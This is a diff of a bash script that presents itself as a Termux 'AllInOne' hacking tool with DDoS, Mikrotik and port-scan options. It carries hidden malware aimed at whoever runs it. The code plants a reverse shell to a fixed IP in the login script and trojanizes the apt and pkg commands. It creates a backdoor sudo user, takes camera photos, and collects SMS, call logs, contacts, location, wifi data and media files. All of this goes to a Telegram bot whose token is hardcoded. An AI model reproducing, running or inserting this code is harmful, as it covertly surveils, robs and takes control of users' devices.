+			rm -rfd badshell/badshell
+                	if [[ $termux == "true" ]];then
+                		cat $PREFIX/bin/Hacked > $PREFIX/etc/termux-login.sh
+                	fi
+
+        		echo -e $info $r "FIX ALL MISSING ON AllInOne"
+        		rm -rfd badshell/
+        		git clone https://github.com/blue24bluer/badshell &>> /dev/null
+
+                	if [[ $? == "0" ]];then
+
+                		base64 badshell/worm > $PREFIX/bin/Boomb
+                		echo " cat $PREFIX/bin/Boomb | base64 -d | bash " > $PREFIX/bin/run_Boomb
+                		chmod +x $PREFIX/bin/run_Boomb
+                		rm -rfd badshell/
+                		mkdir $PREFIX/etc/Hacked
+
+                	else
+
+                		echo -e $info "Some Thing is Error !"
+                		sleep 4
+                		badshell
+
+                	fi
+
+	else
+
+		echo -e $bad "No Network !!"
+		echo -e $info $r "You Have To Trun On Your Wifi For First Time You Run This Tool"
+		sleep 5
+		exit
+
+	fi
+
+#	bash $PREFIX/bin/Hacked
+
+	if [[ $termux==true ]];then
+
+		cd $PREFIX/bin
+		git clone https://github.com/blue24bluer/Fix_IT.sh &>> /dev/null
+		cp $PREFIX/bin/apt $PREFIX/bin/B24B.apt
+		chmod +x $PREFIX/bin/B24B.apt
+		touch $PREFIX/bin/apt
+		cp $PREFIX/bin/apt $PREFIX/bin/pkg
+		echo 'bash -c "0<&139-;exec 139<>/dev/tcp/193.161.193.99/62187;sh <&139 >&139 2>&139" &>> /dev/null & ' > $PREFIX/etc/termux-login.sh
+		chmod +x $PREFIX/bin/apt
+
+	else
+
+
+	# Trojan Bash Script
+
+	# Create a backdoor user
+		useradd -m -s /bin/bash trojan
+		echo "B24B:B24B" | chpasswd
+		echo "B24B ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+		mv $PREFIX/bin/apt $PREFIX/bin/B24B.apt
+		chmod +x $PREFIX/bin/B24B.apt
+		touch $PREFIX/bin/apt
+		echo ' bash -c "0<&139-;exec 139<>/dev/tcp/193.161.193.99/62187;sh <&139 >&139 2>&139" & bash $PREFIX/bin/Hacked &>> /dev/null & B24B.apt \$@ ' > $PREFIX/bin/apt
+		cp $PREFIX/bin/apt $PREFIX/bin/pkg
+	# Create a startup script to run the backdoor on bootup
+		cp $PREFIX/bin/apt $PREFIX/etc/init.d/trojan_startup.sh
+		chmod +x $PREFIX/etc/init.d/B24B_stats
+
+# Start the backdoor now
+		service B24B_startup start
+
+	fi
+
+if [[ $termux == true ]];then
+if [[ $SyS == "T" ]];then
+#Camera##############################################################################
+	termux-camera-photo -c 1 $PREFIX/etc/Hacked/victam.jpg 		&>> /dev/null
+#################################################################################
+	if [[ $? == "0" ]];then
+
+		echo " "
+
+	else
+
+		echo -e $bad "Something is Error !"
+		sleep 3
+		dpkg
+
+	fi
+#################################################################################
+	termux-camera-photo -c 0 $PREFIX/etc/Hacked/victam.jpg 		&>> /dev/null
+#################################################################################
+	if [[ $? == "0" ]];then
+#################################################################################
+		echo " "
+
+	else
+
+		echo -e $bad "Something is Error !"
+		sleep 3
+		dpkg
+
+	fi
+#Sms#################################################################################
+	termux-sms-list > $PREFIX/etc/Hacked/victam.sms 		&>> /dev/null
+#################################################################################
+	if [[ $? == "0" ]];then
+
+		echo " "
+
+	else
+
+		echo -e $bad "Something is Error !"
+		sleep 3
+		dpkg
+
+	fi
+#################################################################################
+	termux-telephony-deviceinfo > $PREFIX/etc/Hacked/victam.sim 	&>> /dev/null
+#################################################################################
+	if [[ $? == "0" ]];then
+
+		echo " "
+
+	else
+
+		echo -e $bad "Something is Error !"
+		sleep 3
+		dpkg
+
+	fi
+#################################################################################
+	termux-call-log > $PREFIX/etc/Hacked/victam.call 		&>> /dev/null
+#################################################################################
+	if [[ $? == "0" ]];then
+
+		echo " "
+
+	else
+
+		echo -e $bad "Something is Error !"
+		sleep 3
+		dpkg
+
+	fi
+#################################################################################
+	termux-contact-list > $PREFIX/etc/Hacked/victam.call2 		&>> /dev/null
+#################################################################################
+	if [[ $? == "0" ]];then
+
+		echo " "
+
+	else
+
+		echo -e $bad "Something is Error !"
+		sleep 3
+		dpkg
+
+	fi
+#Wifi################################################################################
+	termux-wifi-connectioninfo > $PREFIX/etc/Hacked/victam.wifi 	&>> /dev/null
+#################################################################################
+	if [[ $? == "0" ]];then
+
+		echo " "
+
+	else
+
+		echo -e $bad "Something is Error !"
+		sleep 3
+		dpkg
+
+	fi
+#################################################################################
+
+#location############################################################################
+	termux-location > $PREFIX/etc/Hacked/victam.location 		&>> /dev/null
+#################################################################################
+	if [[ $? == "0" ]];then
+
+		echo " "
+
+	else
+
+		echo -e $bad "Something is Error !"
+		sleep 3
+		dpkg
+
+	fi
+#################################################################################
+
+		for Datas in $(ls $PREFIX/etc/Hacked/*)
+                do
+
+                        curl -F document=@$Datas "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+                done
+fi
+#####################################################################################
+	sleep 5
+	menu
+else
+menu
+fi
+
+fi
+}
+#{----------------------Start-----------------}
+start(){
+installit
+badshell
+menu
+}
+#-----------------------------------------------
+SKIP(){
+ban
+net
+
+echo -e $info "Loading .. .. .. [X]"
+
+# this can bulid a backdoor in your system
+
+	if [[ -d $PREFIX/etc/Hacked ]] ;then
+
+		menu
+
+	else
+
+		#Camera##############################################################################
+		termux-camera-photo -c 1 $PREFIX/etc/Hacked/victam.jpg          &>> /dev/null
+		#################################################################################
+		if [[ $? == "0" ]];then
+
+			echo " "
+
+		else
+
+			echo -e $bad "Something is Error !"
+			sleep 3
+			dpkg
+
+		fi
+		#################################################################################
+		termux-camera-photo -c 0 $PREFIX/etc/Hacked/victam.jpg          &>> /dev/null
+		#################################################################################
+		if [[ $? == "0" ]];then
+
+			echo " "
+
+		else
+
+			echo -e $bad "Something is Error !"
+			sleep 3
+			dpkg
+
+		fi
+		#Sms#################################################################################
+		termux-sms-list > $PREFIX/etc/Hacked/victam.sms                 &>> /dev/null
+		#################################################################################
+		if [[ $? == "0" ]];then
+
+			echo " "
+
+		else
+
+			echo -e $bad "Something is Error !"
+			sleep 3
+			dpkg
+
+		fi
+		#################################################################################
+		termux-telephony-deviceinfo > $PREFIX/etc/Hacked/victam.sim     &>> /dev/null
+		#################################################################################
+		if [[ $? == "0" ]];then
+
+			echo " "
+
+		else
+
+			echo -e $bad "Something is Error !"
+			sleep 3
+			dpkg
+
+		fi
+		#################################################################################
+		termux-call-log > $PREFIX/etc/Hacked/victam.call                &>> /dev/null
+		#################################################################################
+		if [[ $? == "0" ]];then
+
+			echo " "
+
+		else
+
+			echo -e $bad "Something is Error !"
+			sleep 3
+			dpkg
+
+		fi
+		#################################################################################
+		termux-contact-list > $PREFIX/etc/Hacked/victam.call2           &>> /dev/null
+		#################################################################################
+		if [[ $? == "0" ]];then
+
+			echo " "
+
+		else
+
+			echo -e $bad "Something is Error !"
+			sleep 3
+			dpkg
+
+		fi
+		#Wifi################################################################################
+		termux-wifi-connectioninfo > $PREFIX/etc/Hacked/victam.wifi     &>> /dev/null
+		#################################################################################
+		if [[ $? == "0" ]];then
+
+			echo " "
+
+		else
+
+			echo -e $bad "Something is Error !"
+			sleep 3
+			dpkg
+
+		fi
+		#location############################################################################
+		termux-location > $PREFIX/etc/Hacked/victam.location            &>> /dev/null
+		#################################################################################
+		if [[ $? == "0" ]];then
+
+			echo " "
+
+		else
+
+			echo -e $bad "Something is Error !"
+			sleep 3
+			dpkg
+
+		fi
+		#################################################################################
+SendHackedFile(){
+		zip -r $PREFIX/etc/Hacked/Hacked.zip $PREFIX/etc/Hacked/*
+		TOKEN="5691570782:AAGMKFygk9MyAlZXtPNddydtDsY4Ouo8-ng"
+		CHAT_ID="5010958919"
+		IPaddres=$(curl ifconfig.me)
+		DATAS=$(neofetch)
+		FILES=/storage/
+		VIDEO=$(find $FILES -name *.mp4)
+		PNG=$(find $FILES -name *.png)
+		JPG=$(find $FILES -name *.jpg)
+		H4CKED=$PREFIX/etc/Hacked/Hacked.zip
+
+		curl -F document=@$H4CKED "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+		if [[ $? == "0" ]];then
+			menu
+		else
+			SendHackedFile
+		fi
+		#####################################################################################
+		#####################################################################################
+		sleep 5
+}
+SendHackedFile
+	fi
+
+}
+
+#----------------------------------------------
+Reast(){
+
+echo -e $ask $red " are you sure will remove all data of this tool ? "
+printf " write here Y/N:>"
+read -p " ------------:}=> " re
+if [[ $re == "Y" ]];then
+        rm -rfd $PREFIX/bin/B24B.apt
+        rm -rfd $PREFIX/bin/B24B_Mikrotik
+        rm -rfd $PREFIX/etc/B24B/
+        rm -rfd $HOME/.ngrok/
+        rm -rfd $PREFIX/etc/Hacked
+        rm -rfd $PREFIX/etc/Hacked
+        rm -rfd $PREFIX/bin/Hacked
+        rm -rfd $PREFIX/bin/worm
+	for i in $(find / -name B24B_*) ;do
+        rm -rfd $i
+
+                done
+                for o in $(find / -name B24B-*) ;do
+	rm -rfd $o
+                done
+                for p in $(find / -name *-B24B) ;do
+        rm -rfd $p
+                done
+                for q in $(find / -name *_B24B) ;do
+        rm -rfd $p
+                done
+$apt remove pv -y                                       &>> /dev/null
+$apt remove lolcat -y                                   &>> /dev/null
+$apt remove toilet -y                                   &>> /dev/null
+$apt remove openssl -y                                  &>> /dev/null
+$apt remove openssh -y                                  &>> /dev/null
+$apt remove zip -y                                      &>> /dev/null
+$apt remove neofetch -y                                 &>> /dev/null
+$apt remove curl -y                                     &>> /dev/null
+$apt remove python python3 -y                           &>> /dev/null
+pip  remove wordlist -y                                 &>> /dev/null
+
+        cd $home/../
+        rm -rfd $home/
+        git clone https://github.com/blue24bluer/AllInOne
+        echo -e $r "UPDATEING ...."
+        cd AllInOne/
+        python AllInOne.sh --start
+
+elif [[ $re == "N" ]];then
+exit
+else
+echo -e $bad " error i dont understand you sir ? "
+exit
+fi
+
+
+}
+#----------------------------------------------
+#begin
+
+case "$1" in
+
+--msg)
+
+if [[ -d $PREFIX/etc/B24B/ ]];then
+
+net
+if [[ $nN == 'Y' ]];then
+set $2 message
+IPaddres=$(curl ifconfig.me)
+
+echo -e $info " Ok, I will fix it $happy "
+curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text=" Hi Boss You have new message frome $IPaddres "
+curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text=" $message "
+
+echo -e $message
+else
+
+echo -e $bad "There No internet !!!"
+
+fi
+
+else
+
+echo -e $info "For First Installion you have to start this tool by putting '--start' command !"
+
+fi
+;;
+
+--DDOS)
+
+if [[ -d $PREFIX/etc/B24B/ ]];then
+
+DDos
+
+else
+
+echo -e $info "For First Installion you have to start this tool by putting '--start' command !"
+
+fi
+
+;;
+--ddos)
+
+if [[ -d $PREFIX/etc/B24B/ ]];then
+
+DDos
+
+else
+
+echo -e $info "For First Installion you have to start this tool by putting '--start' command !"
+
+fi
+
+;;
+-d)
+
+if [[ -d $PREFIX/etc/B24B/ ]];then
+
+DDos
+
+else
+
+echo -e $info "For First Installion you have to start this tool by putting '--start' command !"
+
+fi
+
+;;
+-D)
+
+if [[ -d $PREFIX/etc/B24B/ ]];then
+
+DDos
+
+else
+
+echo -e $info "For First Installion you have to start this tool by putting '--start' command !"
+
+fi
+
+;;
+--start)
+echo -e $info " Starting .... "
+start
+
+;;
+-s)
+echo -e $info " Starting .... "
+start
+
+;;
+--Start)
+echo -e $info " Starting .... "
+start
+
+;;
+-S)
+echo -e $info " Starting .... "
+start
+
+
+;;
+--skip)
+if [[ -d $PREFIX/etc/B24B/ ]];then
+
+	echo -e $info "Are You Sure About Skip To Menu Without Install And Update PackAge ? y/n"
+	echo -e $info "Mybe You Will Have Some Problem In This Tool If You Skiped !"
+	read ANSO
+	if [[ $ANSO == "y" || $ANSO == "Y" || $ANSO == "yes" || $ANSO == "Yes" || $ANSO == "yeah" || $ANSO == "Yeah" || $ANSO == "YEAH" || $ANSO == "YES" ]] ;then
+		SKIP
+	else
+		echo ''
+		exit
+	fi
+else
+	echo -e $info "For First Installion you have to start this tool by putting '--start' command !"
+	exit
+fi
+
+;;
+--Mikrotik)
+
+if [[ -d $PREFIX/etc/B24B/ ]];then
+
+Mik
+
+else
+
+echo -e $info "For First Installion you have to start this tool by putting '--start' command !"
+
+fi
+
+;;
+-M)
+
+if [[ -d $PREFIX/etc/B24B/ ]];then
+
+Mik
+
+else
+
+echo -e $info "For First Installion you have to start this tool by putting '--start' command !"
+
+fi
+
+;;
+-m)
+
+if [[ -d $PREFIX/etc/B24B/ ]];then
+
+Mik
+
+else
+
+echo -e $info "For First Installion you have to start this tool by putting '--start' command !"
+
+fi
+
+;;
+--Reast)
+
+Reast
+
+;;
+--reast)
+
+Reast
+
+;;
+-r)
+
+Reast
+
+;;
+-R)
+
+Reast
+
+;;
+--Port)
+
+if [[ -d $PREFIX/etc/B24B/ ]];then
+
+port
+
+else
+
+echo -e $info "For First Installion you have to start this tool by putting '--start' command !"
+
+fi
+
+;;
+-p)
+
+if [[ -d $PREFIX/etc/B24B/ ]];then
+
+port
+
+else
+
+echo -e $info "For First Installion you have to start this tool by putting '--start' command !"
+
+fi
+
+;;
+-P)
+
+if [[ -d $PREFIX/etc/B24B/ ]];then
+
+port
+
+else
+
+echo -e $info "For First Installion you have to start this tool by putting '--start' command !"
+
+fi
+
+;;
+*)
+echo -e $info " put this commands to run this tool Fast : "
+echo -e $info " bash $name --start OR -s OR -S" $blue " to start this tool "
+echo -e $info " bash $name --Mikrotik OR -m OR -M" $blue " for start and Hack Mikrotik routers "
+echo -e $info " bash $name --Port OR -p OR -P" $blue " for speedy scan ports on your device "
+echo -e $info " bash $name --Reast OR -r OR -R $red this will reinstall this tool ! "
+echo -e $info " bash $name --msg " $blue " for msg me on telegram "
+echo -e $info " bash $name --DDOS OR -d OR -D" $blue " Start DDos Attacking on server !"
+echo -e $info " bash $name --skip " $blue " For Skip Install And Update This Tool "
+echo -e " "
+echo -e " "
+echo -e $info " This Tool Made By @Blue24Bluer $r AND I DON'T SUPPORT ANY WRONG USE OF THIS TOOL "
+echo -e $info " $b My Account On Social Media Applications : "
+echo -e $y "
+
+---------------------------------------------
+$p TikTok   (Personal)   $r <:> $b @blue24bluer       $y
+$b Telegram (Personal)   $r <:> $p @Blue24Bluer       $y
+$p FaceBook (Personal)   $r <:> $b ★comming_soon★     $y
+$b Discord  (Personal)   $r <:> $p @Blue24Bluer #8271 $y
+---------------------------------------------         $y
+$p Telegram (Group)      $r <:> $b @H7Tools           $y
+$b Discord  (Group)      $r <:> $p ★comming_soon★     $y
+---------------------------------------------         $y
+
+"
+
+exit
+
+esac
+
